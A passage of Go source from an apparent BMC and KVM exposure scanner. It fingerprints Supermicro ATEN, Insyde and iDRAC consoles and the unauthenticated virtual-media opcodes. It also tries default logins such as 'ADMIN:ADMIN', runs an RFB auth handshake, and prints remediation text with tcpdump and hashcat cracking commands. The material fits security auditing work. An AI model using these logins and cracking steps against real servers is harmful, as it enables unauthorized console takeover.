		"residualAuth", "ikvmserver VM HMAC auth still required for media ops",
	)
	if slotStatus == "" {
		fields = append(fields, engine.ProofUnavailable("status reply carried no slot payload"))
	} else {
		fields = append(fields,
			engine.Field{Key: "slotStatus", Val: slotStatus},
			engine.Field{Key: "proof", Val: proofKV("tunnel", "wss-vm", "payLen", strconv.Itoa(payLen), "slotStatus", slotStatus)},
		)
	}
	return engine.Finding{
		Check: "kvm.smc.ws.bypass", Category: "exposure", Risk: "info",
		Port: 443, Transport: "tcp", Protocol: "wss",
		Fields: fields,
	}
}

// ikvmAuthAndInit performs the full Insyde/ATEN RFB handshake:
// version echo -> security type select (Tight=0x10) -> 24B challenge read ->
// 49B auth payload -> SecurityResult -> ClientInit -> ServerInit.
// Returns desktop (width, height, name) and whether auth succeeded.
func ikvmAuthAndInit(conn net.Conn, authPay []byte, to time.Duration) (width, height int, serverName string, ok bool) {
	vc := &vncConn{c: conn, to: to}

	banner, good := vc.read(12)
	if !good || !strings.HasPrefix(string(banner), "RFB ") {
		return
	}
	if !vc.write(banner) {
		return
	}

	// Read security type list (U8 count + count bytes)
	countB, good := vc.read(1)
	if !good || countB[0] == 0 {
		return
	}
	types, good := vc.read(int(countB[0]))
	if !good || !slices.Contains(types, byte(0x10)) {
		return
	}

	if !vc.write([]byte{0x10}) { // select Tight
		return
	}
	if _, good = vc.read(24); !good { // read and discard challenge
		return
	}
	if !vc.write(authPay) {
		return
	}

	result, good := vc.read(4)
	if !good || result[0] != 0 || result[1] != 0 || result[2] != 0 || result[3] != 0 {
		return
	}
	ok = true

	// ClientInit (shared=1) then ServerInit
	if !vc.write([]byte{0x01}) {
		return
	}
	// ServerInit: 2(w)+2(h)+16(pixfmt)+4(namelen)+N(name)+SMC-ext
	si, good := vc.read(24)
	if !good {
		return
	}
	width = int(binary.BigEndian.Uint16(si[0:2]))
	height = int(binary.BigEndian.Uint16(si[2:4]))
	nameLen := int(binary.BigEndian.Uint32(si[20:24]))
	if nameLen > 0 && nameLen < 256 {
		name, good := vc.read(nameLen)
		if good {
			serverName = string(name)
		}
	}
	return
}

// usbAnywhereLooksLikeATEN decides whether an open TCP/623 channel is plausibly
// the Supermicro ATEN virtual-media (USBAnywhere) listener rather than one of the
// many unrelated services, proxies and tarpits that also answer on 623.
//
// The ATEN vmedia listener sits behind stunnel and speaks a request/response binary
// protocol, so it never sends an unsolicited banner: it either completes a TLS
// handshake or stays mute waiting for the client. Anything that speaks first on
// plain TCP is a foreign service, so an unsolicited banner is the reject signal.
func usbAnywhereLooksLikeATEN(st kvmChannelState) bool {
	if !st.open {
		return false
	}
	if st.proto == "tls" {
		// A completed TLS handshake on 623 is the stunnel front-end; accept it.
		return true
	}
	// Plain TCP: the real ATEN listener is mute behind stunnel. Any unsolicited
	// banner means some other service answered on 623 -- reject it.
	return st.handshakeHex == ""
}

func runKVMUSBAnywhere(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 623, t.Timeout)
	if !st.open {
		return nil
	}
	// Fallback port-open evidence for devices where the full GET_DEV_STATUS probe
	// in kvm.smc.vmedia fails. X13+ is TLS (stunnel verify=0); X10-era is also TLS
	// but its shared iKVM client cert has expired, so those now present as bare TCP.
	// The banner gate rejects the many non-ATEN services that answer on 623.
	if !usbAnywhereLooksLikeATEN(st) {
		return nil
	}
	fields := kvmFieldsFrom("usbanywhere", kvmVendorOr(t, "supermicro"), 623, st)
	return []engine.Finding{{
		Check:     "kvm.usbAnywhere",
		Category:  "exposure",
		Risk:      "info",
		Port:      623,
		Transport: "tcp",
		Protocol:  "aten-vmedia",
		Fields:    fields,
	}}
}

// runKVMSMCVMedia probes the ATEN virtual-media daemon on TCP/623 with
// GET_DEV_STATUS (opcode 0x08), which needs no credentials and returns slot
// availability. X10 is mTLS and requires the shared client cert; X13 and later are
// plain TLS. The 8-byte request is answered with a slot count plus one status byte
// per slot: 0xFF unused, 0x00 present with no media, anything else media mounted.
func runKVMSMCVMedia(ctx context.Context, t *engine.Target) []engine.Finding {
	res := probeATENVMedia(t.Host, 623, t.Timeout)
	if res == nil {
		return nil
	}
	return []engine.Finding{smcVMediaFinding(t, res)}
}

// smcVMediaFinding turns one GET_DEV_STATUS/GET_PLATFORM_INFO exchange into its
// finding. Split out from the probe so the evidence can be exercised against a
// synthesized reply.
//
// The reply opcode is not recorded: probeATENVMedia only returns a result when
// the header carried it, so it is the same on every host. The platform ID is a
// board value the daemon reports and belongs in the proof next to the slot
// bytes, which are otherwise the same default layout across most units.
func smcVMediaFinding(t *engine.Target, res *vmediaResult) engine.Finding {
	platform := ""
	if res.platformID != 0 {
		platform = strconv.Itoa(res.platformID)
	}
	fields := engine.F(
		"vendor", kvmVendorOr(t, "supermicro"),
		"channel", "aten-vmedia",
		"slots", strconv.Itoa(res.slotCount),
		"slotStatus", res.slotSummary,
		"proof", proofKV("channel", "aten-vmedia", "slots", strconv.Itoa(res.slotCount), "slotStatus", res.slotSummary, "platformId", platform),
	)
	if platform != "" {
		fields = append(fields, engine.Field{Key: "platformId", Val: platform})
	}
	return engine.Finding{
		Check:     "kvm.smc.vmedia",
		Category:  "exposure",
		Risk:      "info",
		Port:      623,
		Transport: "tcp",
		Protocol:  "aten-vmedia",
		Fields:    fields,
	}
}

// vmediaResult holds the parsed GET_DEV_STATUS + GET_PLATFORM_INFO responses.
type vmediaResult struct {
	slotCount   int
	slotSummary string // e.g. "unused,unused,unused"
	platformID  int    // from opcode 0x0A reply byte[0]; 0=unknown, 80(0x50)=X13
}

// probeATENVMedia dials TCP/623 (trying TLS first) and sends GET_DEV_STATUS
// (opcode 0x08) to the ATEN virtual-media daemon. Returns nil if the port is
// closed, the TLS handshake fails, or no valid response arrives.
//
// Both 5900 (KVM) and 623 (VM) are TLS-wrapped by stunnel. X10-era firmware sets
// verify=3 and demands the shared ATEN client cert (now expired, so those hosts
// reject the handshake); X13+ sets verify=0 and answers any TLS client. ikvmserver
// closes the connection after each response, so every opcode needs its own dial.
// GET_DEV_STATUS (0x08->0x09) and GET_PLATFORM_INFO (0x0A->0x0B) are both
// unauthenticated.
func probeATENVMedia(host string, port int, to time.Duration) *vmediaResult {
	if to <= 0 {
		to = 5 * time.Second
	}

	// dialVM opens one TLS (or plain TCP fallback) connection to the vmedia port.
	dialVM := func() (net.Conn, bool) {
		d := &net.Dialer{Timeout: to}
		if tc, terr := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)),
			&tls.Config{InsecureSkipVerify: true}); terr == nil {
			return tc, true
		}
		c, cerr := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), to)
		if cerr != nil {
			return nil, false
		}
		return c, true
	}

	// vmSend sends an 8-byte PDU with opcode and no payload, reads the
	// response header + payload, and returns the payload bytes.
	vmSend := func(opcode byte) []byte {
		conn, ok := dialVM()
		if !ok {
			return nil
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(to))
		req := []byte{0x00, 0x00, 0x00, opcode, 0x00, 0x00, 0x00, 0x00}
		if _, err := conn.Write(req); err != nil {
			return nil
		}
		var hdr [8]byte
		if _, err := io.ReadFull(conn, hdr[:]); err != nil {
			return nil
		}
		payLen := binary.LittleEndian.Uint32(hdr[4:8])
		if payLen == 0 || payLen > 64 {
			return nil
		}
		payload := make([]byte, payLen)
		if _, err := io.ReadFull(conn, payload); err != nil {
			return nil
		}
		return payload
	}

	// GET_DEV_STATUS (opcode 0x08) -> response opcode 0x09.
	// payload[0] = slot count, payload[1..N] = per-slot status bytes.
	// Slot status: 0xFF = unused (no active USB_PLUGIN session),
	//              0x00 = slot claimed, no media selected,
	//              else = media type code (1=CDROM, 2=floppy, 3=disk image).
	gdsPayload := vmSend(0x08)
	if len(gdsPayload) < 1 {
		return nil
	}
	slotCount := int(gdsPayload[0])
	statusNames := map[byte]string{0xFF: "unused", 0x00: "no-media"}
	parts := make([]string, 0, slotCount)
	for i := 1; i < len(gdsPayload) && i <= slotCount; i++ {
		s := gdsPayload[i]
		if n, ok := statusNames[s]; ok {
			parts = append(parts, n)
		} else {
			parts = append(parts, fmt.Sprintf("media-0x%02x", s))
		}
	}
	res := &vmediaResult{
		slotCount:   slotCount,
		slotSummary: strings.Join(parts, ","),
	}

	// GET_PLATFORM_INFO (opcode 0x0A) -> response opcode 0x0B, 2-byte payload.
	// payload[0] = platform version ID (0x50=80 -> X13/AST2600; 87-89 -> X10-era).
	// payload[1] = company/board ID (0x00 = generic SMC).
	// Requires a fresh connection -- server closes after each response.
	if pip := vmSend(0x0A); len(pip) >= 1 {
		res.platformID = int(pip[0])
	}

	return res
}

// kvmFieldsFrom builds the fields for a reachable KVM channel: identified
// vendor, channel protocol tag, encryption details, certificate CN, and the
// first server-sent handshake bytes when available.
//
// A proof field is attached only when the device produced something: a
// certificate, negotiated TLS parameters, or bytes it sent first. A listener
// that speaks only after its client produced none of that, and the port, the
// channel name and the transport are the probe's own parameters, not the
// device's answer. Those findings carry the marker instead, so the evidence
// contract reads them as unproven rather than as proven by their own
// disclaimer. How the peer turned down TLS is still recorded, as a plain field,
// because it is a reaction rather than content.
func kvmFieldsFrom(channel, vendor string, port int, st kvmChannelState) []engine.Field {
	fields := engine.F(
		"vendor", vendor,
		"channel", channel,
		"encryption", st.proto,
	)
	if st.cn != "" {
		fields = append(fields, engine.Field{Key: "cn", Val: st.cn})
	}
	if st.tlsVersion != "" {
		fields = append(fields, engine.Field{Key: "tlsVersion", Val: st.tlsVersion})
	}
	if st.alpn != "" {
		fields = append(fields, engine.Field{Key: "tlsAlpn", Val: st.alpn})
	}
	if st.handshakeHex != "" {
		fields = append(fields, engine.Field{Key: "raw", Val: st.handshakeHex})
	}
	if !kvmChannelSpoke(st) {
		reason := kvmChannelMute[channel]
		if reason == "" {
			reason = "listener sent nothing before the read deadline"
		}
		if st.tlsOutcome != "" {
			fields = append(fields, engine.Field{Key: "tlsHandshake", Val: st.tlsOutcome})
		}
		return append(fields, engine.ProofUnavailable(reason))
	}
	return append(fields, engine.Field{Key: "proof", Val: kvmChannelProof(channel, port, st)})
}

// kvmChannelMute names, per channel, why a reachable listener can be expected to
// volunteer nothing. Kept short: it is one label per check, and a never-varying
// value of prose length is what the constant-evidence rule is looking for.
var kvmChannelMute = map[string]string{
	"usbanywhere": "aten vmedia listener is mute behind stunnel",
}

// kvmChannelSpoke reports whether the probe recorded anything a device chose:
// certificate identity, negotiated parameters, or bytes it sent first.
func kvmChannelSpoke(st kvmChannelState) bool {
	return st.cn != "" || st.tlsVersion != "" || st.alpn != "" || st.handshakeHex != ""
}

// kvmChannelProof renders what the channel probe observed on a listener that
// spoke: the certificate and negotiated parameters when TLS came up, how it
// turned TLS down when it did not, and the count of bytes it volunteered. The
// port and channel are carried so the multi-port checks (kvm.hpe.irc,
// kvm.ami.vmedia) stay distinguishable. serverBytes is reported only when there
// were some; a zero would be the gate's value, not the device's.
//
// Only called for a channel that produced content -- see kvmChannelSpoke.
func kvmChannelProof(channel string, port int, st kvmChannelState) string {
	kv := []string{
		"channel", channel,
		"tcpPort", strconv.Itoa(port),
		"transport", st.proto,
		"commonName", st.cn,
		"tlsVersion", st.tlsVersion,
		"tlsAlpn", st.alpn,
		"tlsHandshake", st.tlsOutcome,
	}
	if n := len(st.handshakeHex) / 2; n > 0 {
		kv = append(kv, "serverBytes", strconv.Itoa(n))
	}
	return proofKV(kv...)
}

// runKVMStandaloneVNC fingerprints the RFB console: cleartext vs TLS-tunnelled, the
// protocol version (003.008 ATEN, 055.008 AST2400 Insyde) and the auth scheme, plus
// a default-credential check on the custom SMC schemes when online logins are
// allowed.
//
// SMC/ATEN on TCP/5900 departs from the RFB spec: the stunnel-wrapped port sends no
// banner and waits for the client, a bare RFB version string post-TLS resets the
// connection, and access is session-gated on a token the web UI writes for the KVM
// launcher -- so the TLS cert is the only fingerprint obtainable without a web
// session. Cleartext RFB on 5900 still exists on older units and takes the standard
// probe path below.
func runKVMStandaloneVNC(ctx context.Context, t *engine.Target) []engine.Finding {
	vendor := identityVendor(t)
	for _, p := range []int{5900, 5901} {
		info := probeVNC(t.Host, p, t.Timeout, !t.DisableLogins, vendor)
		if info == nil {
			continue
		}
		return []engine.Finding{vncConsoleFinding(t, p, info)}
	}
	return nil
}

// vncConsoleFinding turns one probed console into the finding its handshake
// justifies. Split out from the port loop so each arm can be exercised against
// a synthesized handshake result.
func vncConsoleFinding(t *engine.Target, p int, info *vncInfo) engine.Finding {
	enc := "none"
	if info.tls {
		enc = "tls"
	}
	fv := kvmVendorOr(t, "")
	base := []string{
		"vendor", fv,
		"version", info.version,
		"encryption", enc,
		"auth", info.auth,
		"secTypes", info.secTypes,
		"cn", info.cn,
	}
	if info.org != "" {
		base = append(base, "certOrg", info.org)
		// The console TLS cert's organization normalized to a slug ("Dell Inc." ->
		// dell), so the identity backfill can attribute an otherwise-blank host.
		for _, f := range vendorSlugField(info.org) {
			base = append(base, f.Key, f.Val)
		}
	}
	// Attribute the Dell iDRAC screen-share channel: iDRAC7-10 back RFB on
	// 5900 with the AVOCENT avct engine (the HTML5 client rides
	// wss://host/vkvm/, fingerprinted separately by the httpscan corpus).
	if fv == "dell" || strings.Contains(strings.ToLower(info.cn), "idrac") {
		base = append(base, "product", "iDRAC (AVOCENT avct KVM)", "kvmEndpoint", "wss://<host>/vkvm/")
	}
	if info.insydeChallenge != nil {
		allZero := true
		for _, b := range info.insydeChallenge {
			if b != 0 {
				allZero = false
				break
			}
		}
		if allZero {
			base = append(base, "insydeSession", "none")
		} else {
			base = append(base, "insydeSession", "active",
				"insydeChallenge", fmt.Sprintf("%x", info.insydeChallenge))
		}
	}
	switch {
	case info.defaultUser != "":
		// A default credential authenticated: the server returned RFB
		// SecurityResult=0 (auth OK). The result code and the "it authenticated"
		// flag are both fixed by the arm that emits this, so the proof records the
		// handshake that got there and which credential the server accepted.
		return engine.Finding{
			Check: "kvm.vnc.defaultCreds", Category: "creds", Risk: "critical",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append(base,
				"defaultUsername", info.defaultUser,
				"defaultPassword", info.defaultPass,
				"proof", proofKV(
					"tcpPort", strconv.Itoa(p),
					"rfbVersion", info.version,
					"rfbSecurityTypes", info.secTypes,
					"rfbAuth", info.auth,
					"acceptedUsername", info.defaultUser,
					"rfbSecurityResult", "0"),
			)...),
		}
	case info.auth == "none":
		// The server advertised RFB security type None: console access with no
		// authentication at all. auth=none is the arm's own condition, so the
		// evidence is the version and the type list the server offered.
		return engine.Finding{
			Check: "kvm.vnc.unauth", Category: "exposure", Risk: "high",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append([]string{"proof", proofKV(
				"tcpPort", strconv.Itoa(p),
				"rfbVersion", info.version,
				"rfbSecurityTypes", info.secTypes,
				"commonName", info.cn)},
				base...)...),
		}
	case enc == "none" && info.auth == "vncauth":
		// Cleartext VNC challenge-response: crackable and unencrypted transport.
		// The absence of TLS is this arm's condition, not a measurement, so the
		// proof carries the handshake instead.
		return engine.Finding{
			Check: "kvm.vnc.cleartextAuth", Category: "exposure", Risk: "low",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append([]string{"proof", proofKV(
				"tcpPort", strconv.Itoa(p),
				"rfbVersion", info.version,
				"rfbSecurityTypes", info.secTypes,
				"rfbAuth", info.auth)},
				base...)...),
		}
	default:
		// An auth-gated console is present: fingerprint only (no success to prove).
		// The proof is the handshake the server actually ran -- RFB version and
		// offered security types, or, on a session-gated console that answers TLS
		// with no RFB banner, the completed handshake and its certificate.
		return engine.Finding{
			Check: "kvm.vnc", Category: "exposure", Risk: "info",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append([]string{"proof", proofKV(
				"tcpPort", strconv.Itoa(p),
				"transport", enc,
				"rfbVersion", info.version,
				"rfbSecurityTypes", info.secTypes,
				"rfbAuth", info.auth,
				"commonName", info.cn,
				"certOrg", info.org,
			)}, base...)...),
		}
	}
}

// -- inlined RFB/VNC probe ---------------------------------------------------
//
// Supermicro/ATEN and the AST2400 "Insyde" stacks use a custom RFB auth, but the
// front of the handshake is standard, so transport, protocol version and auth scheme
// still fingerprint cleanly. Their auth message is a null-padded 24-byte username
// plus 24-byte password sent in the clear after the custom security type is
// selected, answered by a 4-byte SecurityResult (0 = ok).

// vncInfo is the result of a VNC probe.
type vncInfo struct {
	tls             bool
	version         string // e.g. "003.008"
	auth            string // none|vncauth|aten|insyde|tight|session-gated|unknown
	secTypes        string // the RFB security types the server offered
	cn              string // TLS cert CN, when TLS
	org             string // TLS cert O (organization), when TLS
	defaultUser     string // set if a default credential authenticated
	defaultPass     string
	insydeChallenge []byte // 24-byte Insyde challenge; all-zero = no active web session
}

// vncConn abstracts the plain or TLS connection carrying RFB.
type vncConn struct {
	c  net.Conn
	to time.Duration
}

func (v *vncConn) read(n int) ([]byte, bool) {
	_ = v.c.SetReadDeadline(time.Now().Add(v.to))
	buf := make([]byte, n)
	got := 0
	for got < n {
		m, err := v.c.Read(buf[got:])
		got += m
		if err != nil {
			break
		}
	}
	if got == 0 {
		return nil, false
	}
	return buf[:got], true
}

func (v *vncConn) write(b []byte) bool {
	_ = v.c.SetWriteDeadline(time.Now().Add(v.to))
	_, err := v.c.Write(b)
	return err == nil
}

// vncTLSMinTimeout floors the console TLS handshake: a BMC terminating TLS in a
// stunnel on a slow SoC core needs seconds, not milliseconds.
const vncTLSMinTimeout = 5 * time.Second

// dialVNCTLS completes a TLS handshake to a console port, retrying once. A single
// attempt makes a slow handshake indistinguishable from a closed port, and the
// consequence is a silently missing port rather than a recorded failure.
func dialVNCTLS(addr string, to time.Duration) (*tls.Conn, error) {
	var err error
	for attempt := range 2 {
		var tc *tls.Conn
		tc, err = tls.DialWithDialer(&net.Dialer{Timeout: to}, "tcp", addr,
			&tls.Config{InsecureSkipVerify: true}) // #nosec G402 -- fingerprinting a device cert, not trusting it
		if err == nil {
			return tc, nil
		}
		// Only a timeout or reset is worth retrying; a refused connection means the
		// port really is closed and a second attempt just costs budget.
		if attempt == 0 && !vncTLSWorthRetry(err) {
			break
		}
	}
	return nil, err
}

// vncTLSWorthRetry reports whether a failed console TLS handshake looks transient.
func vncTLSWorthRetry(err error) bool {
	if err == nil {
		return false
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return true
	}
	s := err.Error()
	return strings.Contains(s, "connection reset") || strings.Contains(s, "unexpected EOF") ||
		strings.Contains(s, "broken pipe") || strings.Contains(s, "handshake failure")
}

// probeVNC fingerprints a VNC port: cleartext RFB vs TLS-wrapped console, plus the
// protocol version and auth scheme when the raw RFB handshake is exposed, and a
// default-credential check for the custom SMC schemes when online logins are
// allowed. SMC/ATEN consoles that answer TLS with no RFB banner are session-gated
// and reported as auth="session-gated" with the cert CN. Returns nil only when the
// port is neither a raw RFB nor a TLS listener.
func probeVNC(host string, port int, to time.Duration, online bool, vendor string) *vncInfo {
	if to <= 0 {
		to = 3 * time.Second
	}
	addr := net.JoinHostPort(host, strconv.Itoa(port))

	// 1. Cleartext RFB (server-first ProtocolVersion banner).
	if c, err := net.DialTimeout("tcp", addr, to); err == nil {
		vc := &vncConn{c: c, to: to}
		if b, ok := vc.read(12); ok && strings.HasPrefix(string(b), "RFB ") {
			info := &vncInfo{version: parseRFBVersion(b)}
			negotiateVNC(vc, info, online, vendor)
			c.Close()
			return info
		}
		c.Close()
	}

	// 2. TLS listener (Supermicro wraps the console in TLS on 5900; Dell iDRAC's
	// AVOCENT console is TLS-only and session-gated, with no RFB banner).
	//
	// This handshake gets a floor and one retry. A single attempt at t.Timeout flakes
	// often enough to matter, and a flaked handshake does not merely lose the console
	// finding: MarkOpen is driven by findings, so tcp/5900 vanishes from the port map
	// and the record shows no VNC surface rather than an unmeasured one.
	tc, err := dialVNCTLS(addr, max(to, vncTLSMinTimeout))
	if err != nil {
		return nil // neither raw RFB nor TLS: not a VNC console
	}
	defer tc.Close()
	info := &vncInfo{tls: true}
	if cs := tc.ConnectionState(); len(cs.PeerCertificates) > 0 {
		cert := cs.PeerCertificates[0]
		info.cn = cert.Subject.CommonName
		// Surface the org name so the finding distinguishes SMC ("Super Micro
		// Computer") from other TLS-wrapped KVM products.
		if len(cert.Subject.Organization) > 0 {
			info.org = cert.Subject.Organization[0]
		}
	}
	vc := &vncConn{c: tc, to: min(to, time.Second)}
	if b, ok := vc.read(12); ok && strings.HasPrefix(string(b), "RFB ") {
		info.version = parseRFBVersion(b)
		negotiateVNC(vc, info, online, vendor)
	} else {
		// TLS console that does not expose a raw RFB banner -- verified against
		// lab SMC/ATEN devices. The port is session-gated: the Java KVM launcher
		// exchanges a one-time token written by the web UI; a scanner without a
		// valid web session cannot proceed past the TLS handshake.
		info.auth = "session-gated"
	}
	return info
}

// negotiateVNC completes the RFB security-type exchange on an established RFB stream
// and, when permitted, runs a single default-credential check.
//
// Insyde 055.008 is session-gated: it only accepts an auth payload carrying a valid
// web-session SID and has no plaintext-credential fallback, so default-credential
// probing is skipped for it. An all-zero 24-byte challenge means no web session is
// active.
func negotiateVNC(vc *vncConn, info *vncInfo, online bool, vendor string) {
	if !vc.write([]byte("RFB " + info.version + "\n")) {
		info.auth = "unknown"
		return
	}
	types := readSecurityTypes(vc)
	info.auth = classifyVNCAuth(info.version, types)
	info.secTypes = renderSecTypes(types)

	switch info.auth {
	case "insyde":
		// Insyde 055.008 (AST2400/AST2600): select Tight (0x10) then read the
		// 24-byte challenge. All-zero challenge = no web session active on BMC.
		// Auth requires the web-session SID as the credential (IKVM_sid_decrypt);
		// the plaintext-credential path (UtilAuthUser) was removed in 055.008.
		if len(types) > 0 && vc.write([]byte{0x10}) {
			if ch, ok := vc.read(24); ok {
				info.insydeChallenge = append([]byte(nil), ch...)
			}
		}
	case "aten":
		if online {
			if u, p, ok := vncTryDefault(vc, info.auth, types, vendor); ok {
				info.defaultUser, info.defaultPass = u, p
			}
		}
	}
}

// parseRFBVersion extracts "xxx.yyy" from an "RFB xxx.yyy\n" banner.
func parseRFBVersion(banner []byte) string {
	s := strings.TrimSpace(string(banner))
	if !strings.HasPrefix(s, "RFB ") || len(s) < 11 {
		return ""
	}
	return s[4:11] // "xxx.yyy"
}

// readSecurityTypes reads the RFB 3.7+ security-type list (U8 count + bytes).
func readSecurityTypes(vc *vncConn) []byte {
	b, ok := vc.read(1)
	if !ok || len(b) == 0 || b[0] == 0 {
		return nil
	}
	n := int(b[0])
	types, ok := vc.read(n)
	if !ok {
		return nil
	}
	return types
}

// renderSecTypes names the RFB security types the server offered (e.g.
// "None(1),VNC(2),Tight(16)"), so the finding proof quotes what the server
// actually advertised rather than a static label.
func renderSecTypes(types []byte) string {
	if len(types) == 0 {
		return "none-listed"
	}
	names := map[byte]string{1: "None", 2: "VNC", 5: "RA2", 6: "RA2ne", 16: "Tight", 19: "VeNCrypt"}
	parts := make([]string, 0, len(types))
	for _, t := range types {
		if n, ok := names[t]; ok {
			parts = append(parts, n+"("+strconv.Itoa(int(t))+")")
		} else {
			parts = append(parts, strconv.Itoa(int(t)))
		}
	}
	return strings.Join(parts, ",")
}

// classifyVNCAuth maps the version + offered security types to a scheme name.
//
// Insyde 055.008: the ikvmserver removed UtilAuthUser (plaintext cred check) and
// uses only IKVM_sid_decrypt (session-based). Auth requires a web-session SID in
// the 49-byte payload (24B SID + 24B zeros + 1B clientType). Password is never
// sent. All-zero 24-byte challenge = no active web session on the BMC.
func classifyVNCAuth(version string, types []byte) string {
	if version == "055.008" {
		return "insyde" // AST2400/AST2600 session-gated auth -- no cred-only path
	}
	has := func(t byte) bool {
		return slices.Contains(types, t)
	}
	switch {
	case has(16): // Tight -> ATEN on Supermicro
		return "aten"
	case has(2):
		return "vncauth"
	case has(1):
		return "none"
	case len(types) == 0:
		return "unknown"
	default:
		return "type" + strconv.Itoa(int(types[0]))
	}
}

// vncTryDefault selects the ATEN security type (Tight=16) and sends a single default
// 24+24 username/password, reading the 4-byte SecurityResult (0 = ok). Exactly one
// attempt: a failed one desyncs the stream, so a retry would need a fresh handshake
// and risk lockout. Any protocol deviation counts as not authenticated.
//
// Called for auth="aten" only; Insyde 055.008 is session-gated and uses a different
// SID-based payload (see negotiateVNC for that gate).
func vncTryDefault(vc *vncConn, scheme string, types []byte, vendor string) (string, string, bool) {
	// Select the custom security type (Tight=16 for ATEN).
	if len(types) > 0 {
		sel := byte(16)
		if !containsByte(types, 16) {
			sel = types[0]
		}
		if !vc.write([]byte{sel}) {
			return "", "", false
		}
	}
	// ATEN Tight sub-negotiation carries the 0xaff90fb0 tunnel magic (U32) before
	// auth; drain those 4 bytes.
	_, _ = vc.read(4)
	cand := vncDefaults(vendor)[0]
	u, p, _ := strings.Cut(cand, ":")
	if !vc.write(append(pad24(u), pad24(p)...)) {
		return "", "", false
	}
	res, ok := vc.read(4)
	if ok && len(res) == 4 && res[0] == 0 && res[1] == 0 && res[2] == 0 && res[3] == 0 {
		return u, p, true
	}
	return "", "", false
}

// vncDefaults returns default VNC credentials to try, vendor first.
func vncDefaults(vendor string) []string {
	if vendor == "supermicro" {
		return []string{"ADMIN:ADMIN"}
	}
	return []string{"ADMIN:ADMIN", "admin:admin"}
}

func pad24(s string) []byte {
	b := make([]byte, 24)
	copy(b, s)
	return b
}

func containsByte(bs []byte, b byte) bool {
	return slices.Contains(bs, b)
}

func init() {
	for _, check := range []string{
		"kvm.avocent.aps", "kvm.ami.redirect", "kvm.ami.vmedia",
		"kvm.hpe.irc", "kvm.cisco.vkvm", "kvm.usbAnywhere",
	} {
		c := check
		RegisterExplain(c, func(host string, f engine.Finding) string {
			return explainKVMChannel(host, f)
		})
		_ = c
	}
	RegisterExplain("kvm.vnc", explainKVMVNC)
	RegisterExplain("kvm.vnc.unauth", explainKVMVNCUnauth)
	RegisterExplain("kvm.vnc.cleartextAuth", explainKVMVNCCleartext)
	RegisterExplain("kvm.vnc.defaultCreds", explainKVMVNCDefaultCreds)
}

// portServiceName maps KVM redirection port numbers to human-readable names.
var portServiceName = map[int]string{
	3900:  "Avocent APS KVM console",
	7578:  "AMI KVM redirection service",
	5120:  "AMI virtual-media daemon",
	5121:  "AMI virtual-media daemon",
	5122:  "AMI virtual-media daemon",
	5123:  "AMI virtual-media daemon",
	623:   "USBAnywhere / KVM-side redirection channel",
	17988: "HPE iLO Integrated Remote Console (IRC)",
	17990: "HPE iLO IRC (TLS)",
	2068:  "Cisco CIMC vKVM console",
}

func explainKVMChannel(host string, f engine.Finding) string {
	vendor := explainField(f, "vendor")
	enc := explainField(f, "encryption")
	port := explainPortOrDefault(f, f.Port)
	svc := portServiceName[port]
	if svc == "" {
		svc = "KVM redirection service"
	}
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString(fmt.Sprintf("\n**%s** (%s) reachable on TCP/%d", svc, vendor, port))
	if enc == "tcp" {
		b.WriteString(" -- **no TLS** (cleartext channel)")
	} else if enc == "tls" {
		b.WriteString(" over TLS")
	}
	b.WriteString(".\n")
	b.WriteString("\n**Confirm reachability:**\n")
	b.WriteString(explainSh(fmt.Sprintf("nc -zv %s %d", host, port)))
	if enc == "tcp" {
		b.WriteString("\n\n> KVM channel uses no TLS -- the desktop stream can be captured by a\n")
		b.WriteString("> network-adjacent attacker.\n")
	}
	return b.String()
}

func explainKVMVNC(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	ver := explainField(f, "version")
	enc := explainField(f, "encryption")
	auth := explainField(f, "auth")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nVNC/RFB console listener detected.\n")
	if ver != "" {
		b.WriteString(fmt.Sprintf("**Protocol version:** `%s`  **Encryption:** `%s`  **Auth:** `%s`\n", ver, enc, auth))
	}
	b.WriteString("\n**Connect:**\n")
	b.WriteString(explainSh(fmt.Sprintf("vncviewer %s:%d", host, port)))
	return b.String()
}

func explainKVMVNCUnauth(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	proof := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nVNC/RFB server advertises `SecurityType=None` -- no authentication required.\n")
	if proof != "" {
		b.WriteString(fmt.Sprintf("\n**Proof:** `%s`\n", proof))
	}
	b.WriteString("\n**Connect without credentials:**\n")
	b.WriteString(explainSh(fmt.Sprintf("vncviewer %s:%d", host, port)))
	b.WriteString("\n\n**Impact:** Full unauthenticated KVM access -- view and control the server console.\n")
	return b.String()
}

func explainKVMVNCCleartext(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	proof := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nVNC/RFB server uses VNC auth over a cleartext TCP connection. The\n")
	b.WriteString("challenge-response can be captured from the network and cracked offline.\n")
	if proof != "" {
		b.WriteString(fmt.Sprintf("\n**Proof:** `%s`\n", proof))
	}
	b.WriteString("\n**Crack the VNC password (capture first with tcpdump):**\n")
	b.WriteString(explainSh(
		fmt.Sprintf("tcpdump -i any -w /tmp/vnc.pcap host %s and tcp port %d", host, port),
		"hashcat -m 11200 vnc.hash /usr/share/wordlists/rockyou.txt",
	))
	return b.String()
}

func explainKVMVNCDefaultCreds(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	user := explainField(f, "defaultUsername")
	pass := explainField(f, "defaultPassword")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString(fmt.Sprintf("\nVNC server accepted the default credential **%s / %s**.\n", user, pass))
	b.WriteString("\n**Connect:**\n")
	b.WriteString(explainSh(fmt.Sprintf("vncviewer %s:%d", host, port)))
